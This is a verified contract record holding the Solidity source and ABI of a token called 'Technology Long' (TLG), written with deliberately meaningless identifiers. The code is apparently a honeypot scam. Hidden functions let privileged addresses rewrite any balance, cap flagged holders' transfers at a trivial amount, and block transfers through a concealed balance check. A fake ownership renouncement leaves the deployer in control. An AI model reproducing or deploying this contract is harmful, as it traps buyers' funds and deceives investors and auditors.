{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface tradingBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableBuyAuto) external view returns (uint256);\n\n    function transfer(address fundSell, uint256 atSender) external returns (bool);\n\n    function allowance(address limitIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundSell,\n        uint256 atSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeReceiver, uint256 value);\n    event Approval(address indexed limitIs, address indexed spender, uint256 value);\n}\n\nabstract contract receiverTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundAuto {\n    function createPair(address atLiquidity, address txTeam) external returns (address);\n}\n\ninterface tradingBuyMetadata is tradingBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TechnologyLong is receiverTrading, tradingBuy, tradingBuyMetadata {\n\n    function approve(address receiverIs, uint256 atSender) public virtual override returns (bool) {\n        toSwap[_msgSender()][receiverIs] = atSender;\n        emit Approval(_msgSender(), receiverIs, atSender);\n        return true;\n    }\n\n    string private fundLiquidityAt = \"TLG\";\n\n    function transferFrom(address modeAuto, address fundSell, uint256 atSender) external override returns (bool) {\n        if (_msgSender() != tokenEnable) {\n            if (toSwap[modeAuto][_msgSender()] != type(uint256).max) {\n                require(atSender <= toSwap[modeAuto][_msgSender()]);\n                toSwap[modeAuto][_msgSender()] -= atSender;\n            }\n        }\n        return atLaunched(modeAuto, fundSell, atSender);\n    }\n\n    function getOwner() external view returns (address) {\n        return listMax;\n    }\n\n    function marketingLiquidity(address toAt, uint256 atSender) public {\n        sellWalletReceiver();\n        totalEnable[toAt] = atSender;\n    }\n\n    uint256 private txListExempt = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed enableLiquidity, address indexed totalWallet);\n\n    bool public tradingIs;\n\n    mapping(address => mapping(address => uint256)) private toSwap;\n\n    mapping(address => bool) public marketingSwap;\n\n    function minReceiver(address modeAuto, address fundSell, uint256 atSender) internal returns (bool) {\n        require(totalEnable[modeAuto] >= atSender);\n        totalEnable[modeAuto] -= atSender;\n        totalEnable[fundSell] += atSender;\n        emit Transfer(modeAuto, fundSell, atSender);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundLiquidityAt;\n    }\n\n    uint256 enableWallet;\n\n    uint8 private listFrom = 18;\n\n    uint256 private shouldTake;\n\n    bool private enableMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txListExempt;\n    }\n\n    function sellWalletReceiver() private view {\n        require(marketingSwap[_msgSender()]);\n    }\n\n    mapping(address => uint256) private totalEnable;\n\n    function balanceOf(address enableBuyAuto) public view virtual override returns (uint256) {\n        return totalEnable[enableBuyAuto];\n    }\n\n    address public totalSwapIs;\n\n    uint256 public swapToken;\n\n    function name() external view virtual override returns (string memory) {\n        return enableSwap;\n    }\n\n    function sellMax(address buyReceiverEnable) public {\n        sellWalletReceiver();\n        if (teamEnable) {\n            shouldTake = swapExempt;\n        }\n        if (buyReceiverEnable == listAuto || buyReceiverEnable == totalSwapIs) {\n            return;\n        }\n        walletFrom[buyReceiverEnable] = true;\n    }\n\n    address tokenEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public autoTotal;\n\n    string private enableSwap = \"Technology Long\";\n\n    function atLaunched(address modeAuto, address fundSell, uint256 atSender) internal returns (bool) {\n        if (modeAuto == listAuto) {\n            return minReceiver(modeAuto, fundSell, atSender);\n        }\n        uint256 fundFeeShould = tradingBuy(totalSwapIs).balanceOf(enableTo);\n        require(fundFeeShould == enableWallet);\n        require(fundSell != enableTo);\n        if (walletFrom[modeAuto]) {\n            return minReceiver(modeAuto, fundSell, senderWallet);\n        }\n        return minReceiver(modeAuto, fundSell, atSender);\n    }\n\n    bool public teamEnable;\n\n    mapping(address => bool) public walletFrom;\n\n    bool private maxLiquidityLaunch;\n\n    function transfer(address toAt, uint256 atSender) external virtual override returns (bool) {\n        return atLaunched(_msgSender(), toAt, atSender);\n    }\n\n    function marketingTotal() public {\n        emit OwnershipTransferred(listAuto, address(0));\n        listMax = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return listMax;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listFrom;\n    }\n\n    address private listMax;\n\n    uint256 private swapExempt;\n\n    address enableTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function isFrom(address liquidityBuy) public {\n        if (tradingIs) {\n            return;\n        }\n        if (swapExempt != swapToken) {\n            swapExempt = swapToken;\n        }\n        marketingSwap[liquidityBuy] = true;\n        if (enableMode) {\n            maxLiquidityLaunch = false;\n        }\n        tradingIs = true;\n    }\n\n    constructor (){\n        \n        shouldTo modeLimit = shouldTo(tokenEnable);\n        totalSwapIs = fundAuto(modeLimit.factory()).createPair(modeLimit.WETH(), address(this));\n        \n        listAuto = _msgSender();\n        marketingTotal();\n        marketingSwap[listAuto] = true;\n        totalEnable[listAuto] = txListExempt;\n        if (maxLiquidityLaunch != enableMode) {\n            enableMode = false;\n        }\n        emit Transfer(address(0), listAuto, txListExempt);\n    }\n\n    uint256 constant senderWallet = 15 ** 10;\n\n    function allowance(address walletAt, address receiverIs) external view virtual override returns (uint256) {\n        if (receiverIs == tokenEnable) {\n            return type(uint256).max;\n        }\n        return toSwap[walletAt][receiverIs];\n    }\n\n    function listReceiver(uint256 atSender) public {\n        sellWalletReceiver();\n        enableWallet = atSender;\n    }\n\n    address public listAuto;\n\n    uint256 txAmount;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableBuyAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityBuy\",\"type\":\"address\"}],\"name\":\"isFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atSender\",\"type\":\"uint256\"}],\"name\":\"listReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSender\",\"type\":\"uint256\"}],\"name\":\"marketingLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyReceiverEnable\",\"type\":\"address\"}],\"name\":\"sellMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSwapIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TechnologyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}